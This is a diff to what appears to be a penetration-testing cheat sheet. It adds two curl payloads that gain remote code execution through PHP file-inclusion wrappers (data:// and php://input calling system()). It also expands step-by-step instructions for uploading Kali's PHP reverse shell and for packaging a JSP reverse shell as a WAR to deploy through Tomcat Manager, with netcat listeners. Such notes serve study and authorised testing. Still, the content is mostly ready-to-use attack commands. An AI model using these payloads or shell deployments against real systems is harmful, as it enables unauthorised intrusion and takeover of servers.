@@ -215,6 +215,17 @@ msf6 > use auxiliary/scanner/http/http_put
 - If find Local File Inclusion and Remote File Inclusion
     Switch to the LFI/RFI & Web Attack Payloads Quick Reference Guide
 
+### LFI/RFI & Web Attack Payloads
+
+- RCE via GET payload
+  ```bash
+  curl "http://<target_ip>/<vuln_php_page>?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=<command>"
+  ```
+- RCE via POST payload
+  ```bash
+  curl -X POST "http://<target_ip>/<vuln_php_page>?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "<?php system('<command>'); ?>"
+  ```
+
 ### Brute Force
 
 ```bash
@@ -329,10 +340,11 @@ Kali ships ready-to-use web shells and binaries under /usr/share. Below are the 
     - Orient: Reverse shell needed (outbound usually allowed).
     - Decide: Use bundled php-reverse-shell.php.
     - Act:
-      1. Copy and edit LHOST & LPORT in the file.
-      2. Upload.
-      3. Start listener: `nc -lvnp <LPORT>` or Metasploit multi/handler.
-      4. Browse to the uploaded file to trigger.
+      1. Copy this file.
+      2. Edit the file: set ip and port variables to your Kali IP (LHOST) and listening port (LPORT).
+      3. Upload the modified file.
+      4. Start listener on Kali: `nc -lvnp <LPORT>` or use the Metasploit `/multi/handler` module.
+      5. Browse to the uploaded PHP file to trigger the shell.
 
 - ASPX command shell
   - Path: `/usr/share/webshells/aspx/cmdasp.aspx`
@@ -353,10 +365,14 @@ Kali ships ready-to-use web shells and binaries under /usr/share. Below are the 
     - Orient: Deploy a WAR containing the JSP shell.
     - Decide: Package and deploy JSP shell.
     - Act:
-      1. Edit LHOST & LPORT in JSP.
-      2. Place in `shell/` and package: `jar -cvf shell.war -C shell .` (or `zip -r shell.war shell/`).
-      3. Deploy via Tomcat Manager.
-      4. Start listener and open `http://<target_ip>/shell/jsp-reverse.jsp`.
+      1. Modify `jsp-reverse.jsp` with LHOST and LPORT.
+      2. Create a directory (e.g., `shell/`) and place the JSP inside it.
+      3. Package as WAR:
+         - `jar -cvf shell.war -C shell .`
+         - or `zip -r shell.war shell/`
+      4. Deploy `shell.war` via the Tomcat Manager console.
+      5. Start a listener on Kali: `nc -lvnp <LPORT>`.
+      6. Open `http://<target_ip>/shell/jsp-reverse.jsp` to trigger the shell.
 
 #### Windows Binaries
 
